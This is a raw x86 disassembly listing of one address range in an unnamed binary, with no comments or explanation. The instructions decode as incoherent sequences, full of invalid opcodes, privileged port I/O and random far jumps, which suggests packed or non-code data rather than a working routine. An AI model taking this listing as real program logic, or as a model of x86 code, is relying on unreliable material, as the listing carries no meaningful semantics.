  416808:	sbb    BYTE PTR [edi+0x78dd016b],dh
  41680e:	scas   eax,DWORD PTR es:[edi]
  41680f:	lds    esp,FWORD PTR [esi+edx*8-0x36dc4419]
  416816:	jo     0x4167d8
  416818:	xor    esp,esi
  41681a:	push   0xffffffe2
  41681c:	(bad)  
  41681d:	out    0xf5,al
  41681f:	push   ds
  416820:	ss popf 
  416822:	mov    WORD PTR [edx],es
  416824:	(bad)  
  416825:	push   esp
  416826:	push   0xa72aad21
  41682b:	aad    0x9e
  41682d:	cmc    
  41682e:	(bad)  
  41682f:	mov    ch,0x6a
  416831:	aas    
  416832:	push   esp
  416833:	mov    edi,0xde287f4a
  416838:	enter  0x831,0xc1
  41683c:	sar    DWORD PTR [ebx],0xfd
  41683f:	sbb    al,0x83
  416841:	adc    DWORD PTR ds:0x5ebd0bda,0x44fae5b5
  41684b:	stos   BYTE PTR es:[di],al
  41684d:	ret    
  41684e:	and    DWORD PTR [edi-0x70922a7e],edi
  416854:	fucomi st,st(7)
  416856:	jmp    0x4168a2
  416858:	dec    edi
  416859:	sub    DWORD PTR [eax+ebp*1+0x7],ebp
  41685d:	in     eax,0xfc
  41685f:	inc    ebx
  416860:	mov    al,BYTE PTR [edx+0x76]
  416863:	adc    DWORD PTR [ecx+0x6e],ecx
  416866:	mov    eax,ds:0x2534113d
  41686b:	fcmovnbe st,st(3)
  41686d:	add    DWORD PTR ds:0x44c4a72c,ecx
  416873:	aam    0x37
  416875:	scas   eax,DWORD PTR es:[edi]
  416876:	mov    fs,WORD PTR [esi]
  416878:	xor    edx,edi
  41687a:	dec    ebp
  41687b:	mov    edi,0x314f808
  416880:	cmp    DWORD PTR [eax],0xffffff81
  416883:	pop    ecx
  416884:	add    BYTE PTR [ecx+0x54],dh
  416887:	pop    ecx
  416888:	and    BYTE PTR [ebx],ch
  41688a:	pop    esi
  41688b:	jmp    0x6a80:0x6f5cecb7
  416892:	inc    ecx
  416893:	ins    BYTE PTR es:[edi],dx
  416894:	(bad)  
  416896:	sbb    BYTE PTR [edx+0x3e],ah
  416899:	dec    ebx
  41689a:	cmovnp eax,DWORD PTR [eax+0x624a88d1]
  4168a1:	dec    esp
  4168a2:	mov    edx,0x5674b598
  4168a7:	push   edx
  4168a8:	lods   al,BYTE PTR ds:[esi]
  4168a9:	sub    edi,DWORD PTR [edi+0x14952717]
  4168af:	xor    BYTE PTR [esi],cl
  4168b1:	jmp    0xe26473b2
  4168b6:	mov    edx,0x2da8d666
  4168bb:	push   edi
  4168bc:	pop    ebx
  4168bd:	sbb    eax,0x1b1eaba7
  4168c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168c3:	and    BYTE PTR [ebx-0x4],cl
  4168c6:	imul   ecx,DWORD PTR [ebx+ebx*1+0xc],0x2d9e322f
  4168ce:	mov    esp,0x405852c2
  4168d3:	dec    edi
  4168d4:	hlt    
  4168d5:	mov    eax,ds:0xbb72edaf
  4168da:	jg     0x416929
  4168dc:	sub    al,0x7a
  4168de:	or     DWORD PTR [edx+0x1e620f92],esi
  4168e4:	dec    eax
  4168e5:	dec    ebx
  4168e6:	xchg   esp,eax
  4168e7:	hlt    
  4168e8:	jb     0x4168d5
  4168ea:	add    al,0xd9
  4168ec:	mov    dl,cl
  4168ee:	mov    dh,0x8c
  4168f0:	aas    
  4168f1:	mov    al,0x74
  4168f3:	mul    DWORD PTR [eax-0x288c4ef7]
  4168f9:	ret    0x7b7a
  4168fc:	xchg   BYTE PTR [eax-0x7a],cl
  4168ff:	fild   DWORD PTR [eax]
  416901:	fs aaa 
  416903:	cmp    ah,ah
  416905:	mov    cl,0x6c
  416907:	test   al,0x4e
  416909:	cdq    
  41690a:	sbb    eax,0x9362fea
  41690f:	scas   eax,DWORD PTR es:[edi]
  416910:	cmp    DWORD PTR [ebx+0x21],ebp
  416913:	in     eax,dx
  416914:	test   eax,0x125b696c
  416919:	dec    ebp
  41691a:	push   eax
  41691b:	int3   
  41691c:	(bad)  
  41691d:	call   0x9de3:0x9b84eafa
  416924:	lahf   
  416925:	stos   BYTE PTR es:[edi],al
  416926:	fisttp QWORD PTR [edx+edi*4-0x16]
  41692a:	mov    edi,0x67371c3c
  41692f:	or     eax,0xe818a64a
  416934:	pop    ss
  416935:	mov    ah,0x0
  416937:	pop    es
  416938:	retf   0xbdf4
  41693b:	push   ss
  41693c:	ret    
  41693d:	pop    esi
  41693e:	cld    
  41693f:	mov    ds:0x1fcb46d6,al
  416944:	mov    WORD PTR [eax+0x11],gs
  416947:	loop   0x4168f7
  416949:	mov    al,ds:0x837b3b19
  41694e:	das    
  41694f:	rcl    DWORD PTR [ecx+edi*4-0x7],1
  416953:	sub    DWORD PTR [edi],ebx
  416955:	clc    
  416956:	mov    esi,edi
  416958:	xor    DWORD PTR [edx+0x7353f373],edx
  41695e:	stc    
  41695f:	pop    edi
  416960:	aam    0xb9
  416962:	cs jmp 0xd1cf:0xfe8a96a7
  41696a:	sub    esp,ebp
  41696c:	call   FWORD PTR [ecx]
  41696e:	xchg   ecx,eax
  41696f:	repz (bad) 
  416971:	popf   
  416972:	loop   0x416999
  416974:	ins    DWORD PTR es:[edi],dx
  416975:	bound  edx,QWORD PTR [ecx-0x18]
  416978:	pop    edi
  416979:	pop    ebp
  41697a:	scas   al,BYTE PTR es:[edi]
  41697b:	jb     0x416968
  41697d:	mov    ebx,0x2c4de2b5
  416982:	pop    es
  416983:	pop    esp
  416984:	xchg   esi,eax
  416985:	aaa    
  416986:	jno    0x4169f2
  416988:	call   0xbae2e59e
  41698d:	mov    dh,0x57
  41698f:	sbb    al,0x88
  416991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416992:	out    dx,al
  416993:	fs jo  0x4169c2
  416996:	shl    ebx,0xc2
  416999:	pop    esi
  41699a:	jb     0x4169c8
  41699c:	push   esi
  41699d:	sub    al,ah
  41699f:	bound  edi,QWORD PTR [edi+eiz*2-0x70]
  4169a3:	jmp    0x9ff1cbfa
  4169a8:	sbb    eax,0xc6276786
  4169ad:	aad    0xfd
  4169af:	mov    edx,0x890165f0
  4169b4:	repz out dx,eax
  4169b6:	xor    eax,0x1cf6b7f1
  4169bb:	cld    
  4169bc:	jmp    0x3a22:0xa7518ff6
  4169c3:	inc    ecx
  4169c4:	adc    DWORD PTR [ebx-0x6a],edx
  4169c7:	aad    0x9b
  4169c9:	iret   
  4169ca:	in     al,0x2e
  4169cc:	pop    ds
  4169cd:	(bad)  
  4169ce:	addr16 je 0x416a37
  4169d1:	sbb    al,0xb9
  4169d3:	scas   eax,DWORD PTR es:[edi]
  4169d4:	fbstp  TBYTE PTR ds:[ecx-0x45]
  4169d8:	jg     0x416a03
  4169da:	in     eax,0x83
  4169dc:	test   eax,0x5c3217bf
  4169e1:	imul   ebx,DWORD PTR ds:0x2db82cf1,0xdd75b977
  4169eb:	jecxz  0x4169fb
  4169ed:	mov    gs:0x784c37e6,al
  4169f3:	(bad)  
  4169f4:	push   esi
  4169f5:	or     dh,BYTE PTR [eax-0xb0ce450]
  4169fb:	mov    edx,0x7747be4e
  416a00:	cmc    
  416a01:	xor    eax,0x6142f40b
  416a06:	sahf   
  416a07:	or     DWORD PTR [edi+0x7bf2ce55],0x29fca8e0
  416a11:	push   edx
  416a12:	fs cmp ecx,edx
  416a15:	je     0x4169ea
  416a17:	test   BYTE PTR [ebp-0x2cb65ba8],0x24
  416a1e:	jl     0x4169b9
  416a20:	sahf   
  416a21:	dec    edi
  416a22:	fimul  WORD PTR [ebx+0x7b57dfeb]
  416a28:	pusha  
  416a29:	sub    bl,BYTE PTR [ebx+0x217fee62]
  416a2f:	in     eax,dx
  416a30:	cmp    DWORD PTR es:[edx+ebp*2],eax
  416a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a35:	lds    esi,FWORD PTR ds:0x4f1bb54c
  416a3b:	jg     0x4169cb
  416a3d:	ja     0x4169df
  416a3f:	scas   eax,DWORD PTR es:[edi]
  416a40:	enter  0x15fd,0xb4
  416a44:	cdq    
  416a45:	push   ebp
  416a46:	mov    al,ds:0x57f605de
  416a4b:	jo     0x416a6a
  416a4d:	and    ecx,DWORD PTR [eax*8+0x70061230]
  416a54:	xchg   ecx,eax
  416a55:	call   0x7178:0xa633be06
  416a5c:	xchg   edx,eax
  416a5d:	add    al,0xc1
  416a5f:	jb     0x416a70
  416a61:	hlt    
  416a62:	pop    esi
  416a63:	cld    
  416a64:	pop    edx
  416a65:	mov    cl,0x28
  416a67:	stc    
  416a68:	ins    DWORD PTR es:[edi],dx
  416a69:	aad    0xba
  416a6b:	pushf  
  416a6c:	ins    DWORD PTR es:[edi],dx
  416a6d:	sub    dl,bh
  416a6f:	mov    edi,0x3fb18a9e
  416a74:	jle    0x416a4e
  416a76:	mov    DWORD PTR [eax-0x10],0xd48a211b
  416a7d:	and    eax,0xb8e8ae88
  416a82:	stos   BYTE PTR es:[edi],al
  416a83:	scas   eax,DWORD PTR es:[edi]
  416a84:	bound  eax,QWORD PTR [edx-0x69]
  416a87:	ret    0x32d6
  416a8a:	pop    es
  416a8b:	(bad)  
  416a8c:	inc    ebp
  416a8d:	inc    esi
  416a8e:	sbb    ebp,DWORD PTR [ebx+0x74e2824e]
  416a94:	(bad)  
  416a95:	xchg   ecx,eax
  416a96:	or     eax,0x7cb2dd7c
  416a9b:	lock (bad) 
  416a9d:	enter  0xc16e,0xb5
  416aa1:	jbe    0x416aac
  416aa3:	mov    eax,0x78d5036a
  416aa8:	jle    0x416a3e
  416aaa:	ins    DWORD PTR es:[edi],dx
  416aab:	ins    DWORD PTR es:[edi],dx
  416aac:	jge    0x416ae6
  416aae:	mov    ah,0x27
  416ab0:	sbb    eax,0xbef0e957
  416ab5:	mov    dl,dl
  416ab7:	or     esp,DWORD PTR [edx-0x21cfa3b3]
  416abd:	mov    cl,0xb4
  416abf:	mov    edx,0xec4d2f8a
  416ac4:	mov    bh,0x56
  416ac6:	push   ecx
  416ac7:	mov    eax,0x307e53b3
  416acc:	jne    0x416b16
  416ace:	aas    
  416acf:	in     eax,0x94
  416ad1:	es pop ss
  416ad3:	imul   esi,DWORD PTR [ebp+0x64],0xcc31353
  416ada:	call   DWORD PTR [esi-0x2f536cd5]
  416ae0:	push   0x493944be
  416ae5:	ja     0x416ada
  416ae7:	or     al,0x74
  416ae9:	mov    ch,0x52
  416aeb:	pop    eax
  416aec:	cdq    
  416aed:	cwde   
  416aee:	mov    ch,0x58
  416af0:	pop    eax
  416af1:	pop    ecx
  416af2:	sahf   
  416af3:	fs int3 
  416af5:	es push 0x7c
  416af8:	lds    edi,FWORD PTR [ebx-0x7d8e4ee3]
  416afe:	jae    0x416a85
  416b00:	add    BYTE PTR [edx+0x4f],bl
  416b03:	addr16 (bad) 
  416b05:	jmp    0xb65afd29
  416b0a:	xchg   edx,eax
  416b0b:	inc    ebx
  416b0c:	mov    ds:0x986a172b,eax
  416b11:	cmp    al,0x55
  416b13:	sbb    BYTE PTR [edx+ebx*8-0x2d20a213],ch
  416b1a:	pop    eax
  416b1b:	loopne 0x416a9f
  416b1d:	push   cs
  416b1e:	cmp    BYTE PTR [esi-0x6a],ah
  416b21:	mov    dl,0x3e
  416b23:	mov    ch,0xd
  416b25:	pop    ss
  416b26:	fdivr  st,st(6)
  416b28:	or     ch,BYTE PTR [edx]
  416b2a:	leave  
  416b2b:	mov    eax,ds:0xdb47ae38
  416b30:	xor    ebp,DWORD PTR [edi]
  416b32:	mov    dh,0xcf
  416b34:	fucomp st(3)
  416b36:	into   
  416b37:	push   ebp
  416b38:	and    dl,BYTE PTR [ecx+0x41]
  416b3b:	push   eax
  416b3c:	push   esp
  416b3d:	mov    ecx,0x3b2345f
  416b42:	push   ebx
  416b43:	sahf   
  416b44:	add    DWORD PTR [edi-0x2a59f668],edi
  416b4a:	sub    al,0x30
  416b4c:	ret    0x33dd
  416b4f:	cmp    ah,BYTE PTR [ebp+0x33]
  416b52:	test   eax,0x128463ca
  416b57:	and    al,0x47
  416b59:	(bad)  
  416b5a:	mov    ebx,DWORD PTR [ecx+0x2d]
  416b5d:	stc    
  416b5e:	enter  0x68be,0x36
  416b62:	sbb    al,0x6a
  416b64:	outs   dx,BYTE PTR ds:[esi]
  416b65:	jle    0x416bc0
  416b67:	je     0x416b7e
  416b69:	stos   DWORD PTR es:[edi],eax
  416b6a:	add    BYTE PTR [ebp+0x7b],cl
  416b6d:	dec    ecx
  416b6e:	jp     0x416b77
  416b70:	xor    eax,0xd9ed1ba1
  416b75:	test   eax,0x889970ee
  416b7a:	mov    dh,0x7a
  416b7c:	inc    ecx
  416b7d:	adc    dl,BYTE PTR [ebx-0x6b]
  416b80:	jg     0x416b16
  416b82:	ret    
  416b83:	mov    bl,BYTE PTR [edi+0x2c]
  416b86:	outs   dx,BYTE PTR ds:[esi]
  416b87:	dec    edi
  416b88:	aas    
  416b89:	mov    eax,0xccc98d18
  416b8e:	jo     0x416b59
  416b90:	js     0x416b92
  416b92:	mov    dh,0x91
  416b94:	sub    DWORD PTR [edx-0x6f],ecx
  416b97:	nop
  416b98:	mov    bh,0xfe
  416b9a:	aas    
  416b9b:	outs   dx,BYTE PTR ds:[esi]
  416b9c:	xlat   BYTE PTR ds:[ebx]
  416b9d:	add    BYTE PTR [esi],bh
  416b9f:	sbb    eax,0xca7af258
  416ba4:	hlt    
  416ba5:	je     0x416be6
  416ba7:	and    bl,BYTE PTR [ebx+0x3ef071a0]
  416bad:	inc    ebx
  416bae:	and    bh,bh
  416bb0:	lock adc al,0xa7
  416bb3:	stos   DWORD PTR es:[edi],eax
  416bb4:	inc    ebp
  416bb5:	xchg   ebx,eax
  416bb6:	int    0x26
  416bb8:	xchg   ecx,eax
  416bb9:	xor    BYTE PTR [edx],al
  416bbb:	fmul   DWORD PTR [ecx-0x62]
  416bbe:	jmp    0xdd20:0x21541578
  416bc5:	push   ebx
  416bc6:	or     esp,DWORD PTR [ecx]
  416bc8:	mov    al,ds:0x4a18251d
  416bcd:	(bad)  
  416bce:	out    dx,al
  416bcf:	clc    
  416bd0:	or     BYTE PTR [esi+0x4fd6c655],bh
  416bd6:	or     al,0x80
  416bd8:	xchg   edx,eax
  416bd9:	add    al,0x76
  416bdb:	mov    dl,0x1b
  416bdd:	pop    ebp
  416bde:	mul    cl
  416be0:	add    DWORD PTR [ebp+0x49],eax
  416be3:	retf   
  416be4:	dec    esi
  416be6:	mov    ebx,0x8d421e28
  416beb:	adc    bh,BYTE PTR [ebx]
  416bed:	mov    edi,0x8e80361b
  416bf2:	push   edx
  416bf3:	cmc    
  416bf4:	inc    ebp
  416bf5:	mov    eax,ebx
  416bf7:	pop    edi
  416bf8:	repz pop ebp
  416bfa:	and    al,0xea
  416bfc:	(bad)  
  416bfe:	imul   edi,DWORD PTR [eax+ebp*8+0x6539bb88],0x26
  416c06:	mov    eax,ds:0x865ad5e6
  416c0b:	jbe    0x416c6d
  416c0d:	inc    ebp
  416c0e:	jmp    0xe6f44445
  416c13:	mov    eax,ds:0x28e60bf0
  416c18:	pop    ecx
  416c19:	sti    
  416c1a:	popa   
  416c1b:	mov    ecx,0x158d0a77
  416c20:	aas    
  416c21:	xor    bh,BYTE PTR [edi+edx*1-0x2b]
  416c25:	retf   0x3b59
  416c28:	mov    ds:0xda586880,eax
  416c2d:	outs   dx,DWORD PTR ds:[esi]
  416c2e:	test   BYTE PTR [ecx],ah
  416c30:	lahf   
  416c31:	inc    eax
  416c32:	lock dec ebx
  416c34:	dec    esi
  416c35:	dec    esi
  416c36:	add    eax,DWORD PTR ds:0x1c1d46ab
  416c3c:	out    0xdf,al
  416c3e:	das    
  416c3f:	fucom  st(1)
  416c41:	(bad)  
  416c42:	dec    edx
  416c43:	test   al,0x59
  416c45:	xchg   edi,eax
  416c46:	out    dx,eax
  416c47:	sbb    BYTE PTR [ecx-0x4abb98ae],ah
  416c4d:	mov    bl,0xa1
  416c4f:	rol    DWORD PTR [ebx+0x4b],cl
  416c52:	ret    
  416c53:	pop    esp
  416c54:	xchg   ebx,eax
  416c55:	dec    eax
  416c56:	mov    BYTE PTR [ebx+edx*1+0x40],0x8f
  416c5b:	jge    0x416c6b
  416c5d:	mov    ch,BYTE PTR [edx-0x68]
  416c60:	cmc    
  416c61:	and    DWORD PTR [esi+0xa5e09ff],0xffffffa6
  416c68:	jg     0x416c73
  416c6a:	xor    ch,dl
  416c6c:	pushf  
  416c6d:	and    eax,0xe339f4c9
  416c72:	sub    dh,BYTE PTR [esi+ebp*1]
  416c75:	pop    es
  416c76:	aam    0x3d
  416c78:	xor    al,0xbf
  416c7a:	into   
  416c7b:	fnstsw WORD PTR [eax]
  416c7d:	mov    ebp,0xdf8060de
  416c82:	mul    BYTE PTR [ebp-0xd2ec548]
  416c88:	xor    al,bh
  416c8a:	sar    DWORD PTR ds:[edx-0x72],cl
  416c8e:	das    
  416c8f:	push   ebp
  416c90:	xchg   ecx,eax
  416c91:	xchg   ebp,eax
  416c92:	sbb    DWORD PTR [eax],edx
  416c94:	lea    esi,[eax-0x27]
  416c97:	enter  0x191b,0xec
  416c9b:	lea    ecx,[edi]
  416c9d:	fs pop esi
  416c9f:	push   ebp
  416ca0:	loope  0x416c9e
  416ca2:	xchg   esi,eax
  416ca3:	test   esi,0xbf7f10ce
  416ca9:	adc    al,0xb4
  416cab:	icebp  
  416cac:	idiv   DWORD PTR [esi+ebp*8+0x6bcce75b]
  416cb3:	push   cs
  416cb4:	lods   eax,DWORD PTR ds:[esi]
  416cb5:	(bad)  
  416cb6:	push   eax
  416cb7:	mov    esi,0xcffbd903
  416cbc:	xchg   ebp,eax
  416cbd:	mov    eax,ds:0x3166cd2e
  416cc2:	mov    ds:0xc28426f9,al
  416cc7:	popf   
  416cc8:	xlat   BYTE PTR ds:[ebx]
  416cc9:	shl    edi,1
  416ccb:	push   ecx
  416ccc:	pop    esp
  416ccd:	cmc    
  416cce:	add    DWORD PTR [edi-0x47],ebp
  416cd1:	mov    ah,0x94
  416cd3:	jae    0x416c78
  416cd5:	push   0x87cbf88
  416cda:	push   ds
  416cdb:	push   es
  416cdc:	mov    ebp,DWORD PTR [ebx]
  416cde:	ret    
  416cdf:	iret   
  416ce0:	sub    edx,esi
  416ce2:	sahf   
  416ce3:	aam    0x3b
  416ce5:	lods   eax,DWORD PTR ds:[esi]
  416ce6:	jecxz  0x416cc4
  416ce8:	iret   
  416ce9:	cmp    BYTE PTR [ebx-0x7d00f484],ch
  416cef:	in     eax,dx
  416cf0:	fs das 
  416cf2:	fdivr  st,st(2)
  416cf4:	sub    eax,DWORD PTR [eax-0x3ed1e0a7]
  416cfa:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416cfc:	cs xchg esp,eax
  416cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d00:	js     0x416d7f
  416d02:	loopne 0x416ca6
  416d04:	fisttp QWORD PTR [ebx]
  416d06:	push   ss
  416d07:	pusha  
  416d08:	add    BYTE PTR [edx+0x53],bh
  416d0b:	xor    ebp,ebp
  416d0d:	cmc    
  416d0e:	not    DWORD PTR [edx+edx*8-0x6a]
  416d12:	les    esp,FWORD PTR es:[edx+eiz*1+0x743e9424]
  416d1a:	pop    esp
  416d1b:	mov    ch,0x72
  416d1d:	jnp    0x416d5f
  416d1f:	mov    ebx,0xce21eec5
  416d24:	inc    ecx
  416d25:	in     eax,dx
  416d26:	adc    eax,0x8046a879
  416d2b:	es jo  0x416d8c
  416d2e:	int3   
  416d2f:	inc    edx
  416d30:	dec    eax
  416d31:	les    edi,FWORD PTR [esi+ebp*2+0x40f4ce50]
  416d38:	and    eax,0xf29c8ce7
  416d3d:	pop    ds
  416d3e:	push   cs
  416d3f:	mov    edi,0xec75bd3b
  416d44:	jl     0x416d79
  416d46:	dec    esi
  416d47:	mov    ah,0x92
  416d49:	or     DWORD PTR [eax-0x49e0dd7b],0x42c0881d
  416d53:	add    ah,bh
  416d55:	mov    ds:0x674ed3bd,eax
  416d5a:	sbb    ch,bl
  416d5c:	daa    
  416d5d:	pop    eax
  416d5e:	xor    esp,DWORD PTR [edi+0x1b]
  416d61:	retf   0x480c
  416d64:	sbb    BYTE PTR [ebx+0x1d1afa83],dl
  416d6a:	sbb    edi,DWORD PTR [eax+0x48]
  416d6d:	scas   eax,DWORD PTR es:[edi]
  416d6e:	mov    WORD PTR [edi-0x59],ds
  416d71:	push   ss
  416d72:	das    
  416d73:	dec    esi
  416d74:	jbe    0x416d61
  416d76:	mov    ch,ah
  416d78:	gs push ds
  416d7a:	push   eax
  416d7b:	std    
  416d7c:	or     eax,0x21a02ae4
  416d81:	cld    
  416d82:	pop    esi
  416d83:	push   cs
  416d84:	or     DWORD PTR [edx+0x21],0x8b589068
  416d8b:	or     eax,DWORD PTR [eax+0x3b3edcd3]
  416d91:	adc    ebx,DWORD PTR [ecx-0x3a]
  416d94:	mov    bh,0x31
  416d96:	adc    eax,0x50d51093
  416d9b:	(bad)  
  416d9c:	aam    0xf1
  416d9e:	pop    edx
  416d9f:	xor    esi,edx
  416da1:	dec    ebp
  416da2:	mov    esp,0xdf361b8f
  416da7:	addr16 test al,ch
  416daa:	aas    
  416dab:	push   ss
  416dac:	cmp    DWORD PTR [eax+eax*1-0x2c],esp
  416db0:	sti    
  416db1:	sbb    al,0xee
  416db3:	inc    esp
  416db4:	aad    0xd1
  416db6:	lea    ecx,[ebp-0x49]
  416db9:	aaa    
  416dba:	inc    ebp
  416dbb:	aaa    
  416dbc:	es push es
  416dbe:	in     eax,0x2a
  416dc0:	es je  0x416da3
  416dc3:	push   edi
  416dc4:	add    ch,BYTE PTR [edi+0x73]
  416dc7:	pop    esp
  416dc8:	sahf   
  416dc9:	add    eax,0x3c719056
  416dce:	fild   DWORD PTR [edx+0x28355b07]
  416dd4:	xchg   DWORD PTR [esi+edi*2],edx
  416dd7:	daa    
  416dd8:	xor    edi,esi
  416dda:	aam    0xc9
  416ddc:	pop    ds
  416ddd:	push   0x3ab8a519
  416de2:	push   ebx
  416de3:	sbb    edi,DWORD PTR [ebx]
  416de5:	mov    esp,0x9342830f
  416dea:	xchg   edi,eax
  416deb:	rcr    BYTE PTR [edx-0x47141fee],cl
  416df1:	push   0x69323389
  416df6:	and    eax,0xf6a7df76
  416dfb:	test   dh,bl
  416dfd:	fcmovnbe st,st(2)
  416dff:	or     bh,bl
  416e01:	packuswb mm4,QWORD PTR [ebx+ebp*8+0x737075d]
  416e09:	lds    esp,FWORD PTR [eax]
  416e0b:	inc    esp
  416e0c:	retf   
  416e0d:	sub    edx,edi
  416e0f:	or     al,0x21
  416e11:	or     al,0xea
  416e13:	imul   ebx,DWORD PTR [esi-0x798b1a0f],0xeccfe0b6
  416e1d:	adc    edx,DWORD PTR [edi-0x47]
  416e20:	or     al,0xad
  416e22:	jge    0x416da5
  416e24:	(bad)  
  416e26:	(bad)  
  416e28:	test   DWORD PTR [esp+eax*1+0x1f],ebp
  416e2c:	loope  0x416e4b
  416e2e:	inc    eax
  416e2f:	fst    QWORD PTR [esi]
  416e31:	xlat   BYTE PTR ds:[ebx]
  416e32:	sub    dh,BYTE PTR [ecx+0x21]
  416e35:	sbb    dh,cl
  416e37:	out    0x8d,eax
  416e39:	adc    eax,0x71da9b2d
  416e3e:	shl    DWORD PTR [ecx+0x4c37f287],0x35
  416e45:	(bad)  
  416e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e47:	(bad)  
  416e48:	jnp    0x416df7
  416e4a:	data16 clc 
  416e4c:	mov    al,ds:0x9d4a4011
  416e51:	xchg   ebx,eax
  416e52:	dec    edi
  416e53:	mov    ebp,0xc59acf4f
  416e58:	ret    0x8b1e
  416e5b:	test   eax,0xc6efa5b6
  416e60:	and    eax,0x26f456f3
  416e65:	jle    0x416eb4
  416e67:	xchg   edi,eax
  416e68:	sub    al,0x97
  416e6a:	adc    DWORD PTR [esi],0x66
  416e6d:	(bad)  [ebx-0x7f1889b2]
  416e73:	cmp    BYTE PTR [ebx+ecx*8],cl
  416e76:	aad    0xd1
  416e78:	mov    eax,ds:0x9b6584a1
  416e7d:	pop    ebp
  416e7e:	(bad)  
  416e7f:	fxch   st(2)
  416e81:	ins    DWORD PTR es:[edi],dx
  416e82:	xor    DWORD PTR [eax+0x1e],edx
  416e85:	ja     0x416e97
  416e87:	addr16 and edx,eax
  416e8a:	jge    0x416e2c
  416e8c:	pop    ebx
  416e8d:	outs   dx,DWORD PTR ds:[esi]
  416e8e:	cli    
  416e8f:	mov    ebx,0xca2a894d
  416e94:	mov    esi,0xe5117730
  416e99:	and    esp,DWORD PTR [ecx]
  416e9b:	dec    edi
  416e9c:	daa    
  416e9d:	push   ss
  416e9e:	dec    ebp
  416e9f:	xor    eax,DWORD PTR [edx-0x3a58b7e1]
  416ea5:	jmp    0x416ef8
  416ea7:	sub    BYTE PTR [eax+ebp*8+0x77],0x5e
  416eac:	mov    ecx,0x2b8c2ba0
  416eb1:	fist   DWORD PTR [ebx]
  416eb3:	enter  0x63b,0xa
  416eb7:	or     DWORD PTR [esi+0x646e53d1],ecx
  416ebd:	adc    eax,0x1dcaa98a
  416ec2:	adc    DWORD PTR [ebx],esi
  416ec4:	adc    eax,0x87818e9
  416ec9:	mov    ecx,0xc88981e5
  416ece:	sbb    DWORD PTR [esi+eiz*2],edx
  416ed1:	femms  
  416ed3:	out    dx,al
  416ed4:	jl     0x416ed1
  416ed6:	out    0x9d,eax
  416ed8:	mov    ebx,0xb87a2ac2
  416edd:	dec    eax
  416ede:	and    esi,0x340fd45b
  416ee4:	dec    edx
  416ee5:	dec    eax
  416ee6:	test   DWORD PTR ds:0x4ce0508e,edi
  416eec:	pop    edi
  416eed:	repz les esp,FWORD PTR [edx+ebx*4+0x1f593a5d]
  416ef5:	cdq    
  416ef6:	jno    0x416f58
  416ef8:	jmp    0x416f23
  416efa:	in     eax,0xf4
  416efc:	(bad)
  416eff:	inc    ebx
  416f00:	xchg   ebp,eax
  416f01:	mov    BYTE PTR [edx],0xc5
  416f04:	jae    0x416f0f
  416f06:	push   cs
  416f07:	push   es
  416f08:	or     bh,BYTE PTR [ecx]
  416f0a:	mov    edx,es
  416f0c:	fcom   st(3)
  416f0e:	js     0x416f57
  416f10:	in     al,0xd8
  416f12:	add    eax,0xf444cef0
  416f17:	jmp    0xc9a2:0x1b67d2b
  416f1e:	mov    eax,0xe413c80c
  416f23:	add    eax,0xbdf260e3
  416f28:	scas   eax,DWORD PTR es:[edi]
  416f29:	imul   esp,DWORD PTR [edi+edx*2-0x2f],0xffffffc7
  416f2e:	pop    ebx
  416f2f:	push   ecx
  416f30:	ror    DWORD PTR [ebp-0x5812e296],0xc2
  416f37:	stc    
  416f38:	popa   
  416f39:	pop    ds
  416f3a:	bound  ebx,QWORD PTR [ebx+0x32]
  416f3d:	xor    eax,0xcff3c783
  416f42:	pop    eax
  416f43:	test   DWORD PTR [edi-0x5fb644a3],edi
  416f49:	jns    0x416fc5
  416f4b:	mov    bh,0x89
  416f4d:	retf   0xa6f3
  416f50:	or     BYTE PTR [ecx+esi*1-0x240662a2],0x92
  416f58:	leave  
  416f59:	fwait
  416f5a:	mov    bh,0x88
  416f5c:	pop    edx
  416f5d:	lods   eax,DWORD PTR ds:[esi]
  416f5e:	push   ecx
  416f5f:	jno    0x416f87
  416f61:	pop    es
  416f62:	mov    dh,0x55
  416f64:	push   ecx
  416f65:	imul   esp,DWORD PTR [esi+ecx*4],0xc2393021
  416f6c:	sysexit 
  416f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f6f:	mov    ecx,0x3de88e54
  416f74:	pop    ss
  416f75:	add    bh,BYTE PTR [ebx+0xd]
  416f78:	xor    BYTE PTR [ebx+0x506dec10],0xf2
  416f7f:	xor    al,0x5a
  416f81:	and    DWORD PTR [ebp-0x23],ebp
  416f84:	fucomi st,st(1)
  416f86:	(bad)  [edx+ecx*2-0x4c]
  416f8a:	jmp    0x6853:0xe63cf121
  416f91:	sar    BYTE PTR [eax+0x1f9085a8],0xff
  416f98:	popa   
  416f99:	mov    ds:0x6c85090c,al
  416f9e:	mov    BYTE PTR ss:[edx],al
  416fa1:	xor    BYTE PTR [ebx+0x57813d0e],dh
  416fa7:	test   eax,0x4dfaa6b7
  416fac:	pop    ebx
  416fad:	xor    cl,BYTE PTR [edi-0x2f232e54]
  416fb3:	leave  
  416fb4:	inc    ecx
  416fb5:	shr    BYTE PTR [edx+0x6f280158],1
  416fbb:	das    
  416fbc:	test   DWORD PTR [ecx],esp
  416fbe:	mov    eax,0x471d9b82
  416fc3:	loop   0x417027
  416fc5:	popa   
  416fc6:	test   eax,0x843c40b9
  416fcb:	inc    esp
  416fcc:	inc    edx
  416fcd:	push   ds
  416fce:	xchg   ebx,eax
  416fcf:	aas    
  416fd0:	stos   BYTE PTR es:[edi],al
  416fd1:	xchg   ebx,eax
  416fd2:	out    0xa1,eax
  416fd4:	(bad)  
  416fd5:	cwde   
  416fd6:	ja     0x416f99
  416fd8:	scas   eax,DWORD PTR es:[edi]
  416fd9:	xlat   BYTE PTR ds:[ebx]
  416fda:	adc    ch,BYTE PTR [eax-0x2ac8d5ce]
  416fe0:	test   al,0x8c
  416fe2:	xor    BYTE PTR [eax],dh
  416fe4:	scas   al,BYTE PTR es:[edi]
  416fe5:	cdq    
  416fe6:	or     eax,0xe165edaa
  416feb:	adc    edi,eax
  416fed:	adc    ch,dl
  416fef:	adc    al,0x67
  416ff1:	sub    DWORD PTR [edx+0x43],0xffffff9c
  416ff5:	rol    esp,0x2f
  416ff8:	outs   dx,DWORD PTR ds:[esi]
